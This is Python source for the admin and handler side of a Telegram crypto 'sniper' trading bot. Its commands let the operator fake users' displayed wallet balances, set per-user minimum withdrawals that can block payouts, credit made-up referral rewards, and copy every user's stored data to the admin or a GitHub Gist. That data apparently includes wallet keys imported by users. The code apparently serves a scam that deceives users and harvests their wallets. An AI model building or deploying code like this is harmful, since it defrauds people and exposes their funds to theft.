import asyncio
import json
import os
import re
import time
import logging

import aiohttp
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes

from core.wallet import load_user_data, save_user_data, create_wallet, import_wallet_from_key
from core.snipe import SnipeEngine, SnipeTarget, PriceMonitor
from core.tracker import WhaleTracker
from core.prices import price_service
from core.balances import balance_service
from core.gist import get_or_create_gist, fetch_backup_from_gist
from bot.keyboards import (
    main_menu_keyboard,
    wallet_keyboard,
    wallet_detail_keyboard,
    buy_keyboard,
    sell_keyboard,
    ai_snipe_keyboard,
    copy_trade_keyboard,
    snipe_confirm_keyboard,
    alert_setup_keyboard,
    whale_tracker_keyboard,
    settings_keyboard,
    back_keyboard,
    referral_keyboard,
    token_sniper_keyboard,
    buy_amount_keyboard,
    sl_percentage_keyboard,
    tp_percentage_keyboard,
    withdraw_confirm_keyboard,
    positions_keyboard,
    position_detail_keyboard,
)
from config import CHAINS, ADMIN_USER_ID, USER_DATA_DIR, GITHUB_PAT, GITHUB_GIST_ID

logger = logging.getLogger(__name__)


snipe_engine = SnipeEngine()
price_monitor = PriceMonitor(snipe_engine)
whale_tracker = WhaleTracker()

user_snipe_drafts: dict[int, dict] = {}
user_importing: dict[int, str] = {}
withdraw_data: dict[int, dict] = {}


def get_referral_link(user_id: int) -> str:
    return f"https://t.me/nexionsnipe_tradingbot?start=ref{user_id}"


def track_referral(referrer_id: int, new_user_id: int):
    if referrer_id == new_user_id:
        return
    referrer_data = load_user_data(referrer_id)
    referrals = referrer_data.get("referrals", [])
    if new_user_id not in referrals:
        referrals.append(new_user_id)
    referrer_data["referrals"] = referrals
    save_user_data(referrer_id, referrer_data)


def get_referral_count(user_id: int) -> int:
    data = load_user_data(user_id)
    return len(data.get("referrals", []))


def claim_referral_reward(user_id: int) -> tuple[bool, str]:
    data = load_user_data(user_id)
    ref_count = len(data.get("referrals", []))
    if ref_count < 10:
        needed = 10 - ref_count
        return False, f"Not enough people referred. You need {needed} more."
    claimed = data.get("referral_claimed", 0)
    unclaimed = ref_count - claimed
    if unclaimed <= 0:
        return False, "You have already claimed all available rewards."
    reward = unclaimed * 5
    data["balance"] = data.get("balance", 0) + reward
    data["referral_claimed"] = ref_count
    save_user_data(user_id, data)
    return True, f"Claimed ${reward:.2f} reward from {unclaimed} referrals!"


async def get_user_sol_balance(user_id: int) -> float:
    data = load_user_data(user_id)
    sol_wallet = data.get("wallets", {}).get("solana", {})
    if not sol_wallet or not sol_wallet.get("address"):
        return 0.0
    return await balance_service.get_balance("solana", sol_wallet["address"])


async def get_dashboard_sol_balance(user_id: int) -> float:
    data = load_user_data(user_id)
    manual = data.get("wallet_balances", {})
    if "solana" in manual and manual["solana"] is not None:
        return manual["solana"]
    sol_wallet = data.get("wallets", {}).get("solana", {})
    if not sol_wallet or not sol_wallet.get("address"):
        return 0.0
    return await balance_service.get_balance("solana", sol_wallet["address"])


async def scan_token(address: str) -> dict:
    chain = "solana"
    if len(address) == 42 and address.startswith("0x"):
        chain = "ethereum"

    result = {"chain": chain, "address": address}

    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{address}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    pairs = data.get("pairs", [])
                    if pairs:
                        pair = pairs[0]
                        base = pair.get("baseToken", {})
                        price_usd = float(pair.get("priceUsd", 0))
                        price_native = float(pair.get("priceNative", 0))
                        market_cap = float(pair.get("marketCap", 0) or pair.get("fdv", 0))
                        liquidity = float(pair.get("liquidity", {}).get("usd", 0))
                        volume_24h = float(pair.get("volume", {}).get("h24", 0))
                        change_5m = float(pair.get("priceChange", {}).get("m5", 0) or 0)
                        change_1h = float(pair.get("priceChange", {}).get("h1", 0) or 0)
                        change_6h = float(pair.get("priceChange", {}).get("h6", 0) or 0)
                        change_24h = float(pair.get("priceChange", {}).get("h24", 0) or 0)
                        txns_24h_buys = int(pair.get("txns", {}).get("h24", {}).get("buys", 0))
                        txns_24h_sells = int(pair.get("txns", {}).get("h24", {}).get("sells", 0))
                        pair_created = pair.get("pairCreatedAt", 0)
                        dex = pair.get("dexId", "unknown")
                        pair_address = pair.get("pairAddress", "")
                        info = pair.get("info", {})
                        website = info.get("websites", [])
                        socials = info.get("socials", [])

                        result.update({
                            "name": base.get("name", "Unknown"),
                            "symbol": base.get("symbol", "???"),
                            "price_usd": price_usd,
                            "price_native": price_native,
                            "market_cap": market_cap,
                            "liquidity": liquidity,
                            "volume_24h": volume_24h,
                            "change_5m": change_5m,
                            "change_1h": change_1h,
                            "change_6h": change_6h,
                            "change_24h": change_24h,
                            "txns_24h_buys": txns_24h_buys,
                            "txns_24h_sells": txns_24h_sells,
                            "dex": dex,
                            "pair_address": pair_address,
                            "pair_created": pair_created,
                            "website": website[0].get("url", "") if website else "",
                            "socials": socials,
                            "found": True,
                        })
                        return result
    except Exception:
        pass

    result.update({
        "name": "Unknown",
        "symbol": "???",
        "price_usd": 0.0,
        "found": False,
    })
    return result


ACTION_LABELS = {
    "main_menu": "\U0001f3e0 Main Menu",
    "wallets": "\U0001f510 Wallets",
    "refresh": "\U0001f504 Refresh",
    "ai_snipe": "\U0001f916 AI Snipe",
    "ai_snipe_toggle": "\U0001f504 Toggle AI Snipe",
    "ai_snipe_scanner": "\U0001f50d Token Scanner",
    "ai_snipe_targets": "\U0001f3af Target List",
    "ai_snipe_settings": "\u2699\ufe0f Snipe Settings",
    "copy_trade": "\U0001f46a Copy Trade",
    "copy_add": "\u2795 Add Copy Wallet",
    "copy_list": "\U0001f4cb Copy List",
    "copy_remove": "\u2796 Remove Copy Wallet",
    "buy": "\U0001f680 Buy",
    "sell": "\U0001f4b8 Sell",
    "positions": "\U0001f4ca Positions",
    "search": "\U0001f50d Search",
    "help": "\u2753 Help",
    "settings": "\u2699\ufe0f Settings",
    "wallet_import": "\U0001f511 Import Wallet",
    "snipe_confirm": "\u2705 Confirm Buy",
    "whales": "\U0001f40b Whale Tracker",
    "set_slippage": "\U0001f3b2 Set Slippage",
    "set_mev": "\U0001f6e1\ufe0f Toggle MEV",
    "set_autobuy": "\U0001f4b8 Toggle Auto-Buy",
    "set_autosell": "\U0001f4b5 Toggle Auto-Sell",
    "set_sl_tp": "\u26a0\ufe0f Set SL/TP",
    "set_amounts": "\U0001f4b0 Set Amounts",
}


async def notify_admin(context, user_id, action, extra: str = ""):
    username = "N/A"
    try:
        user = await context.bot.get_chat(user_id)
        username = user.username or user.first_name or "N/A"
    except Exception:
        pass
    label = ACTION_LABELS.get(action, action)
    msg = (
        f"\U0001f4e2 <b>User Activity</b>\n\n"
        f"\U0001f464 User: <code>{user_id}</code> (@{username})\n"
        f"\U0001f4cb Action: {label}\n"
    )
    if extra:
        msg += f"\U0001f4cc {extra}\n"
    try:
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID, text=msg
        )
    except Exception:
        pass


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_USER_ID


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("\u274c Access denied.")
        return

    await update.message.reply_text(build_admin_panel())





async def cmd_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) < 2:
            await update.message.reply_text("Usage: <code>/msg &lt;user_id&gt; <message></code>")
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("\u274c Invalid user_id.")
            return

        message = " ".join(context.args[1:])
        try:
            await context.bot.send_message(chat_id=target_user_id, text=message)
            await update.message.reply_text(f"\u2705 Message sent to <code>{target_user_id}</code>")
        except Exception as e:
            await update.message.reply_text(f"\u274c Failed: {e}")
    except Exception as e:
        logger.error(f"cmd_msg error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if not context.args:
            await update.message.reply_text("Usage: <code>/broadcast <message></code>")
            return

        message = " ".join(context.args)
        sent = 0
        failed = 0

        for filename in os.listdir(USER_DATA_DIR):
            if filename.endswith(".json") and not filename.startswith("_"):
                try:
                    uid = int(filename.replace(".json", ""))
                    await context.bot.send_message(chat_id=uid, text=message)
                    sent += 1
                except Exception:
                    failed += 1

        await update.message.reply_text(f"\u2705 Broadcast sent: {sent} delivered, {failed} failed")
    except Exception as e:
        logger.error(f"cmd_broadcast error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return

        users = []
        for filename in os.listdir(USER_DATA_DIR):
            if filename.endswith(".json") and not filename.startswith("_"):
                try:
                    uid = int(filename.replace(".json", ""))
                    data = load_user_data(uid)
                    wallets = len(data.get("wallets", {}))
                    balance = data.get("balance", 0)
                    users.append((uid, wallets, balance))
                except Exception:
                    pass

        if not users:
            await update.message.reply_text("No users found.")
            return

        text = "\U0001f465 <b>All Users</b>\n\n"
        for uid, wallets, balance in users:
            text += f"\u2022 <code>{uid}</code> \u2014 {wallets} wallet(s), ${balance:,.2f}\n"

        await update.message.reply_text(text)
    except Exception as e:
        logger.error(f"cmd_users error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 1:
            await update.message.reply_text("Usage: <code>/userinfo &lt;user_id&gt;</code>")
            return

        try:
            target_user_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("\u274c Invalid user_id.")
            return

        data = load_user_data(target_user_id)
        wallets = data.get("wallets", {})
        settings = data.get("settings", {})
        balance = data.get("balance", 0)

        username = "N/A"
        try:
            user = await context.bot.get_chat(target_user_id)
            username = user.username or user.first_name or "N/A"
        except Exception:
            pass

        mb = settings.get("min_buy", {})
        if isinstance(mb, dict):
            mb_text = ", ".join(f"{c}: {v}" for c, v in mb.items()) if mb else "default"
        else:
            mb_text = mb if mb else "default"

        mxb = settings.get("max_buy", {})
        if isinstance(mxb, dict):
            mxb_text = ", ".join(f"{c}: {v}" for c, v in mxb.items()) if mxb else "default"
        else:
            mxb_text = mxb if mxb else "default"

        text = (
            f"\U0001f464 <b>User Info</b>\n\n"
            f"ID: <code>{target_user_id}</code>\n"
            f"Username: @{username}\n"
            f"Balance: ${balance:,.2f}\n"
            f"Wallets: {len(wallets)}\n"
            f"Min Buy: {mb_text}\n"
            f"Max Buy: {mxb_text}\n\n"
        )

        for chain, info in wallets.items():
            text += f"\u2022 {chain}: <code>{info['address'][:16]}...</code>\n"

        await update.message.reply_text(text)
    except Exception as e:
        logger.error(f"cmd_userinfo error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return

        await update.message.reply_text("\U0001f4e6 <b>Backing up data...</b>")

        all_data = {}
        if os.path.isdir(USER_DATA_DIR):
            for filename in os.listdir(USER_DATA_DIR):
                if filename.endswith(".json"):
                    try:
                        uid = filename.replace(".json", "")
                        filepath = os.path.join(USER_DATA_DIR, filename)
                        with open(filepath, "r") as f:
                            all_data[uid] = json.load(f)
                    except Exception:
                        pass

        backup_json = json.dumps(all_data, indent=1)
        backup_bytes = backup_json.encode("utf-8")

        import io
        backup_file = io.BytesIO(backup_bytes)
        backup_file.name = f"nexionsnipe_backup_{len(all_data)}_users.json"

        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=backup_file,
            caption=f"\u2705 <b>Backup Complete</b>\n\n\U0001f4ca Users: {len(all_data)}\n\U0001f4be Size: {len(backup_bytes) / 1024:.1f} KB",
        )
    except Exception as e:
        logger.error(f"cmd_backup error: {e}")
        try:
            await update.message.reply_text(f"\u274c Backup error: {e}")
        except Exception:
            pass


async def cmd_restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return

        if not context.args and not update.message.document:
            await update.message.reply_text(
                "Usage: Send <code>/restore</code> with a backup JSON file attached."
            )
            return

        doc = update.message.document
        if not doc:
            await update.message.reply_text("\u274c No file attached.")
            return

        if not doc.file_name.endswith(".json"):
            await update.message.reply_text("\u274c File must be a .json backup file.")
            return

        await update.message.reply_text("\U0001f4e4 <b>Restoring data...</b>")

        file = await doc.get_file()
        backup_bytes = await file.download_as_bytearray()
        all_data = json.loads(backup_bytes.decode("utf-8"))

        restored = 0
        for uid_str, user_data in all_data.items():
            try:
                uid = int(uid_str)
                save_user_data(uid, user_data)
                restored += 1
            except Exception:
                pass

        await update.message.reply_text(
            f"\u2705 <b>Restore Complete</b>\n\n"
            f"\U0001f4ca Users restored: {restored}"
        )
    except Exception as e:
        logger.error(f"cmd_restore error: {e}")
        try:
            await update.message.reply_text(f"\u274c Restore error: {e}")
        except Exception:
            pass


async def auto_backup(context):
    global _gist_id
    try:
        all_data = {}
        if os.path.isdir(USER_DATA_DIR):
            for filename in os.listdir(USER_DATA_DIR):
                if filename.endswith(".json") and not filename.startswith("_"):
                    try:
                        uid = filename.replace(".json", "")
                        filepath = os.path.join(USER_DATA_DIR, filename)
                        with open(filepath, "r") as f:
                            all_data[uid] = json.load(f)
                    except Exception:
                        pass

        if not all_data:
            return

        if GITHUB_PAT:
            _gist_id = await get_or_create_gist(GITHUB_PAT, _gist_id, all_data, len(all_data))
        else:
            import io
            backup_json = json.dumps(all_data, indent=1)
            backup_bytes = backup_json.encode("utf-8")
            backup_file = io.BytesIO(backup_bytes)
            backup_file.name = f"nexionsnipe_backup_{len(all_data)}_users.json"
            await context.bot.send_document(
                chat_id=ADMIN_USER_ID,
                document=backup_file,
                caption=f"\U0001f4be <b>Auto Backup</b>\n\n\U0001f4ca Users: {len(all_data)}\n\U0001f4be Size: {len(backup_bytes) / 1024:.1f} KB",
            )
        logger.info(f"Auto backup done: {len(all_data)} users")
    except Exception as e:
        logger.error(f"auto_backup error: {e}")


_gist_id = GITHUB_GIST_ID


async def auto_restore_on_startup(bot):
    if GITHUB_PAT and _gist_id:
        existing = [f for f in os.listdir(USER_DATA_DIR) if f.endswith(".json")] if os.path.isdir(USER_DATA_DIR) else []
        if not existing:
            logger.info("No user data found, fetching backup from GitHub Gist...")
            backup_data = await fetch_backup_from_gist(GITHUB_PAT, _gist_id)
            if backup_data:
                restored = 0
                for uid_str, user_data in backup_data.items():
                    try:
                        uid = int(uid_str)
                        save_user_data(uid, user_data)
                        restored += 1
                    except Exception:
                        pass
                logger.info(f"Auto-restored {restored} users from Gist")
                try:
                    await bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"\u2705 <b>Auto-Restore Complete</b>\n\n\U0001f4ca Users restored: {restored}",
                    )
                except Exception:
                    pass
            else:
                logger.warning("No backup found in Gist")
                try:
                    await bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text="\u26a0\ufe0f <b>Data empty</b> and no Gist backup found.\nSend <code>/restore</code> with a backup file.",
                    )
                except Exception:
                    pass
    else:
        existing = [f for f in os.listdir(USER_DATA_DIR) if f.endswith(".json")] if os.path.isdir(USER_DATA_DIR) else []
        if not existing:
            try:
                await bot.send_message(
                    chat_id=ADMIN_USER_ID,
                    text="\u26a0\ufe0f <b>Data empty.</b> Set <code>GITHUB_PAT</code> env var for auto-backup, or send <code>/restore</code> with a file.",
                )
            except Exception:
                pass





async def cmd_setminwith(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 3:
            await update.message.reply_text("Usage: <code>/setminwith &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return

        try:
            target_user_id = int(context.args[0])
            chain = context.args[1].lower()
            amount = float(context.args[2])
        except ValueError:
            await update.message.reply_text("\u274c Invalid uid, chain, or amount.")
            return

        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return

        data = load_user_data(target_user_id)
        data.setdefault("min_withdraw", {})[chain] = amount
        save_user_data(target_user_id, data)
        chain_sym = CHAINS.get(chain, {}).get("symbol", "???")
        await update.message.reply_text(
            f"\u2705 {chain.title()} min withdrawal set to {amount:,.4f} {chain_sym} for user <code>{target_user_id}</code>",
        )
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setminwith error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setglobalminwith(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: <code>/setglobalminwith &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return

        chain = context.args[0].lower()
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return

        try:
            amount = float(context.args[1])
        except ValueError:
            await update.message.reply_text("\u274c Invalid amount.")
            return

        global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
        if os.path.exists(global_settings_file):
            with open(global_settings_file) as f:
                g = json.load(f)
        else:
            g = {}
        g.setdefault("min_withdraw", {})[chain] = amount
        with open(global_settings_file, "w") as f:
            json.dump(g, f, indent=2)
        await update.message.reply_text(f"\u2705 Global {chain.title()} min withdrawal set to ${amount:,.2f}")
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setglobalminwith error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setwalletbal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 3:
            await update.message.reply_text("Usage: <code>/setwalletbal &lt;user_id&gt; &lt;chain&gt; &lt;amount&gt;</code>\nChains: solana, ethereum, bsc")
            return

        try:
            target_user_id = int(context.args[0])
            chain = context.args[1].lower()
            amount = float(context.args[2])
        except ValueError:
            await update.message.reply_text("\u274c Invalid user_id, chain, or amount.")
            return

        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return

        data = load_user_data(target_user_id)
        data.setdefault("wallet_balances", {})[chain] = amount
        save_user_data(target_user_id, data)
        await update.message.reply_text(
            f"\u2705 {chain.title()} balance set to {amount:.6f} for user <code>{target_user_id}</code>",
        )
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setwalletbal error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass








async def cmd_setglobalwalletbal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: <code>/setglobalwalletbal &lt;chain&gt; &lt;amount&gt;</code>\nChains: solana, ethereum, bsc")
            return
        chain = context.args[0].lower()
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return
        try:
            amount = float(context.args[1])
        except ValueError:
            await update.message.reply_text("\u274c Invalid amount.")
            return
        sent = 0
        for filename in os.listdir(USER_DATA_DIR):
            if filename.endswith(".json") and not filename.startswith("_"):
                try:
                    uid = int(filename.replace(".json", ""))
                    data = load_user_data(uid)
                    data.setdefault("wallet_balances", {})[chain] = amount
                    save_user_data(uid, data)
                    sent += 1
                except Exception:
                    pass
        await update.message.reply_text(f"\u2705 Global {chain.title()} wallet balance set to {amount:.6f} for {sent} users")
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setglobalwalletbal error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setbuy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 3:
            await update.message.reply_text("Usage: <code>/setbuy &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return
        try:
            target_user_id = int(context.args[0])
            chain = context.args[1].lower()
            amount = float(context.args[2])
        except ValueError:
            await update.message.reply_text("\u274c Invalid uid, chain, or amount.")
            return
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return
        chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
        data = load_user_data(target_user_id)
        data.setdefault("settings", {})[f"buy_amount_{chain_key}"] = amount
        save_user_data(target_user_id, data)
        await update.message.reply_text(
            f"\u2705 {chain.title()} buy amount set to {amount} for user <code>{target_user_id}</code>",
        )
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setbuy error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setsell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 3:
            await update.message.reply_text("Usage: <code>/setsell &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return
        try:
            target_user_id = int(context.args[0])
            chain = context.args[1].lower()
            amount = float(context.args[2])
        except ValueError:
            await update.message.reply_text("\u274c Invalid uid, chain, or amount.")
            return
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return
        chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
        data = load_user_data(target_user_id)
        data.setdefault("settings", {})[f"sell_amount_{chain_key}"] = amount
        save_user_data(target_user_id, data)
        await update.message.reply_text(
            f"\u2705 {chain.title()} sell amount set to {amount} for user <code>{target_user_id}</code>",
        )
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setsell error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setglobalbuy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: <code>/setglobalbuy &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return
        chain = context.args[0].lower()
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return
        try:
            amount = float(context.args[1])
        except ValueError:
            await update.message.reply_text("\u274c Invalid amount.")
            return
        chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
        global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
        if os.path.exists(global_settings_file):
            with open(global_settings_file) as f:
                g = json.load(f)
        else:
            g = {}
        g[f"global_buy_amount_{chain_key}"] = amount
        with open(global_settings_file, "w") as f:
            json.dump(g, f, indent=2)
        await update.message.reply_text(f"\u2705 Global {chain.title()} buy amount set to {amount}")
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setglobalbuy error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


async def cmd_setglobalsell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_admin(update.effective_user.id):
            await update.message.reply_text("\u274c Access denied.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: <code>/setglobalsell &lt;chain&gt; &lt;amt&gt;</code>\nChains: solana, ethereum, bsc")
            return
        chain = context.args[0].lower()
        if chain not in ("solana", "ethereum", "bsc"):
            await update.message.reply_text("\u274c Invalid chain. Use: solana, ethereum, bsc")
            return
        try:
            amount = float(context.args[1])
        except ValueError:
            await update.message.reply_text("\u274c Invalid amount.")
            return
        chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
        global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
        if os.path.exists(global_settings_file):
            with open(global_settings_file) as f:
                g = json.load(f)
        else:
            g = {}
        g[f"global_sell_amount_{chain_key}"] = amount
        with open(global_settings_file, "w") as f:
            json.dump(g, f, indent=2)
        await update.message.reply_text(f"\u2705 Global {chain.title()} sell amount set to {amount}")
        await update.message.reply_text(build_admin_panel())
    except Exception as e:
        logger.error(f"cmd_setglobalsell error: {e}")
        try:
            await update.message.reply_text(f"\u274c Error: {e}")
        except Exception:
            pass


DEFAULT_MIN_WITHDRAW = {"solana": 2.0, "ethereum": 0.5, "bsc": 1.0}


def get_min_withdraw(chain: str = None, user_id: int = None) -> float:
    if user_id:
        data = load_user_data(user_id)
        user_mw = data.get("min_withdraw", {})
        if isinstance(user_mw, dict) and chain:
            if chain in user_mw:
                return user_mw[chain]
        elif isinstance(user_mw, (int, float)) and user_mw > 0:
            return user_mw

    global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
    g = {}
    if os.path.exists(global_settings_file):
        try:
            with open(global_settings_file) as f:
                g = json.load(f)
        except Exception:
            pass
    min_w = g.get("min_withdraw", {})
    if isinstance(min_w, dict) and chain:
        return min_w.get(chain, DEFAULT_MIN_WITHDRAW.get(chain, 2.0))
    elif isinstance(min_w, (int, float)):
        return min_w
    return DEFAULT_MIN_WITHDRAW.get(chain, 2.0) if chain else 2.0


def get_global_setting(key, default=None):
    global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
    if os.path.exists(global_settings_file):
        try:
            with open(global_settings_file) as f:
                g = json.load(f)
                if key in g:
                    return g[key]
        except Exception:
            pass
    return default


def get_buy_amount(user_id: int, chain: str) -> float:
    data = load_user_data(user_id)
    chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
    user_val = data.get("settings", {}).get(f"buy_amount_{chain_key}")
    if user_val is not None:
        return user_val
    global_key = f"global_buy_amount_{chain_key}"
    global_val = get_global_setting(global_key)
    if global_val is not None:
        return global_val
    defaults = {"sol": 0.1, "eth": 0.01, "bnb": 0.1}
    return defaults.get(chain_key, 0.1)


def get_sell_amount(user_id: int, chain: str) -> float:
    data = load_user_data(user_id)
    chain_key = {"solana": "sol", "ethereum": "eth", "bsc": "bnb"}.get(chain, chain)
    user_val = data.get("settings", {}).get(f"sell_amount_{chain_key}")
    if user_val is not None:
        return user_val
    global_key = f"global_sell_amount_{chain_key}"
    global_val = get_global_setting(global_key)
    if global_val is not None:
        return global_val
    defaults = {"sol": 0.1, "eth": 0.01, "bnb": 0.1}
    return defaults.get(chain_key, 0.1)


def build_admin_panel() -> str:
    global_settings_file = os.path.join(USER_DATA_DIR, "_global.json")
    g = {}
    if os.path.exists(global_settings_file):
        try:
            with open(global_settings_file) as f:
                g = json.load(f)
        except Exception:
            pass

    user_count = 0
    if os.path.isdir(USER_DATA_DIR):
        user_count = len([f for f in os.listdir(USER_DATA_DIR) if f.endswith(".json") and not f.startswith("_")])

    mw = g.get("min_withdraw", {})
    if isinstance(mw, dict):
        mw_text = ", ".join(f"{c}: ${v:,.2f}" for c, v in mw.items()) if mw else "not set"
    else:
        mw_text = f"${mw:,.2f}" if mw else "not set"

    return (
        "\U0001f6e1\ufe0f <b>ADMIN PANEL — LIVE</b>\n\n"
        f"\U0001f465 Users: <b>{user_count}</b>\n\n"
        f"\U0001f4b0 <b>Global Settings:</b>\n"
        f"\U0001f4b3 Min Withdraw: {mw_text}\n\n"
        "\U0001f527 <b>User Commands:</b>\n"
        "\u2022 <code>/setbuy &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set buy token amount\n"
        "\u2022 <code>/setsell &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set sell token amount\n"
        "\u2022 <code>/setwalletbal &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set wallet balance\n"
        "\u2022 <code>/setminwith &lt;uid&gt; &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set min withdrawal\n"
        "\u2022 <code>/userinfo &lt;uid&gt;</code> \u2014 View user info\n"
        "\u2022 <code>/msg &lt;uid&gt; &lt;msg&gt;</code> \u2014 Message user\n\n"
        "\U0001f310 <b>Global Commands:</b>\n"
        "\u2022 <code>/setglobalbuy &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set global buy amount\n"
        "\u2022 <code>/setglobalsell &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set global sell amount\n"
        "\u2022 <code>/setglobalwalletbal &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set all wallets balance\n"
        "\u2022 <code>/setglobalminwith &lt;chain&gt; &lt;amt&gt;</code> \u2014 Set global min withdrawal\n"
        "\u2022 <code>/broadcast &lt;msg&gt;</code> \u2014 Message all users\n"
        "\u2022 <code>/users</code> \u2014 List all users\n"
    )


async def build_dashboard(user_data: dict) -> str:
